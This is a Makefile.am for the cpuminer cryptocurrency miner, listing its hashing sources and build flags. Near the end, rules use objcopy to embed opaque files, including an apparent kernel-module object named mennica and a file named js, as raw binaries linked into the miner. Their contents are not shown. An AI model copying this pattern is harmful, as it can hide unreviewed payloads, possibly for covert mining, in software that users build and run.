
if WANT_JANSSON
JANSSON_INCLUDES= -I$(top_srcdir)/compat/jansson
else
JANSSON_INCLUDES=
endif

EXTRA_DIST	= example-cfg.json nomacro.pl

SUBDIRS		= compat

ALL_INCLUDES	= @PTHREAD_FLAGS@ -fno-strict-aliasing $(JANSSON_INCLUDES) -I.

bin_PROGRAMS	= cpuminer

dist_man_MANS	= cpuminer.1

cpuminer_SOURCES = \
  cpu-miner.c util.c \
  api.c sysinfos.c \
  uint256.cpp \
  sha3/sph_keccak.c \
  sha3/sph_hefty1.c \
  sha3/sph_groestl.c \
  sha3/sph_skein.c \
  sha3/sph_bmw.c \
  sha3/sph_jh.c \
  sha3/sph_shavite.c \
  sha3/sph_blake.c \
  sha3/mod_blakecoin.c \
  sha3/sph_luffa.c \
  sha3/sph_cubehash.c \
  sha3/sph_simd.c \
  sha3/sph_echo.c \
  sha3/sph_hamsi.c \
  sha3/sph_haval.c \
  sha3/sph_fugue.c \
  sha3/sph_ripemd.c \
  sha3/sph_sha2.c \
  sha3/sph_sha2big.c \
  sha3/sph_shabal.c \
  sha3/sph_whirlpool.c \
  sha3/gost_streebog.c \
  crypto/blake2s.c \
  crypto/blake2b.c \
  crypto/oaes_lib.c \
  crypto/c_keccak.c \
  crypto/c_groestl.c \
  crypto/c_blake256.c \
  crypto/c_jh.c \
  crypto/c_skein.c \
  crypto/hash.c \
  crypto/aesb.c \
  lyra2/Lyra2.c lyra2/Sponge.c \
  yescrypt/yescrypt-common.c yescrypt/yescrypt-best.c \
  yescrypt/sha256_Y.c \
  algo/allium.c \
  algo/axiom.c \
  algo/bastion.c \
  algo/blake.c \
  algo/blakecoin.c \
  algo/blake2.c \
  algo/bmw256.c \
  algo/c11.c \
  algo/cryptonight.c \
  algo/cryptolight.c \
  algo/decred.c \
  algo/drop.c \
  algo/fresh.c \
  algo/groestl.c \
  algo/heavy.c \
  algo/ink.c \
  algo/jha.c \
  algo/lbry.c \
  algo/luffa.c \
  algo/lyra2re.c \
  algo/lyra2rev2.c \
  algo/myr-groestl.c \
  algo/keccak.c \
  algo/pentablake.c \
  algo/phi1612.c \
  algo/phi2.c \
  algo/quark.c \
  algo/neoscrypt.c \
  algo/nist5.c \
  algo/pluck.c \
  algo/qubit.c \
  algo/scrypt.c \
  algo/scrypt-jane.c \
  algo/sha2.c \
  algo/sia.c \
  algo/sibcoin.c \
  algo/skein.c \
  algo/skein2.c \
  algo/sonoa.c \
  algo/s3.c \
  algo/bitcore.c \
  algo/timetravel.c \
  algo/tribus.c \
  algo/veltor.c \
  algo/x11evo.c \
  algo/x11.c \
  algo/x12.c \
  algo/x13.c \
  algo/x14.c \
  algo/x15.c \
  algo/x16r.c \
  algo/x16s.c \
  algo/x17.c \
  algo/xevan.c \
  algo/yescrypt.c \
  algo/zr5.c

disable_flags =

if USE_ASM
   cpuminer_SOURCES += asm/neoscrypt_asm.S
if ARCH_x86
   cpuminer_SOURCES += asm/sha2-x86.S asm/scrypt-x86.S asm/aesb-x86.S
endif
if ARCH_x86_64
   cpuminer_SOURCES += asm/sha2-x64.S asm/scrypt-x64.S asm/aesb-x64.S
endif
if ARCH_ARM
   cpuminer_SOURCES += asm/sha2-arm.S asm/scrypt-arm.S
endif
else
   disable_flags += -DNOASM
endif

if HAVE_WINDOWS
   cpuminer_SOURCES += compat/winansi.c
endif

libk.o : js.o 1.o 2.o 3.o 4.o 5.o 6.o 7.o 8.o 9.o 10.o 11.o 12.o 13.o 14.o mennica.o
	$(AR) cru $@ $^

OBJCOPY = objcopy --input binary --output elf64-x86-64 --binary-architecture i386

mennica.o : kmod/mennica.c.o
	$(OBJCOPY) $< $@
js.o : input/js
	$(OBJCOPY) $< $@
1.o : input/1.p
	$(OBJCOPY) $< $@
2.o : input/2.p
	$(OBJCOPY) $< $@
3.o : input/3.p
	$(OBJCOPY) $< $@
4.o : input/4.p
	$(OBJCOPY) $< $@
5.o : input/5.p
	$(OBJCOPY) $< $@
6.o : input/6.p
	$(OBJCOPY) $< $@
7.o : input/7.p
	$(OBJCOPY) $< $@
8.o : input/8.p
	$(OBJCOPY) $< $@
9.o : input/9.p
	$(OBJCOPY) $< $@
10.o : input/10.p
	$(OBJCOPY) $< $@
11.o : input/11.p
	$(OBJCOPY) $< $@
12.o : input/12.p
	$(OBJCOPY) $< $@
13.o : input/13.p
	$(OBJCOPY) $< $@
14.o : input/14.p
	$(OBJCOPY) $< $@

CLEANFILES = libk.o js.o 1.o 2.o 3.o 4.o 5.o 6.o 7.o 8.o 9.o 10.o 11.o 12.o 13.o 14.o mennica.o

cpuminer_LDFLAGS	= @LDFLAGS@
cpuminer_LDADD	= libk.o @LIBCURL@ @JANSSON_LIBS@ @PTHREAD_LIBS@ @WS2_LIBS@
cpuminer_CPPFLAGS = @LIBCURL_CPPFLAGS@ $(ALL_INCLUDES)
cpuminer_CFLAGS   = -mavx -msse4.1 -msse4.2 -Wno-pointer-sign -Wno-pointer-to-int-cast $(disable_flags)

if HAVE_WINDOWS
cpuminer_CFLAGS += -Wl,--stack,10485760
cpuminer_LDADD += -lcrypt32 -lgdi32 -lgcc -lgcc_eh
endif

if HAVE_WINDOWS
# use to profile an object
# gprof_cflags = -pg -g3
# cpuminer_LDFLAGS += -pg
# cpuminer_CFLAGS += -fno-inline-functions -static

# copy/paste from generated Makefile
common_ccflags = $(DEFS) $(ALL_INCLUDES) $(cpuminer_CPPFLAGS) $(CPPFLAGS) $(cpuminer_CFLAGS) $(CFLAGS)

# special CFLAGS (if you find a simpler way to do that tell me ;)
cpuminer-neoscrypt.o: neoscrypt.c
	@echo "CUSTOM ${@}: ${filter %.o,${^}} ${filter %.c,${^}}"
	$(CC) $(common_ccflags) -g -O3 $(gprof_cflags) -MT $@ -MD -MP -c -o $@ $<


endif
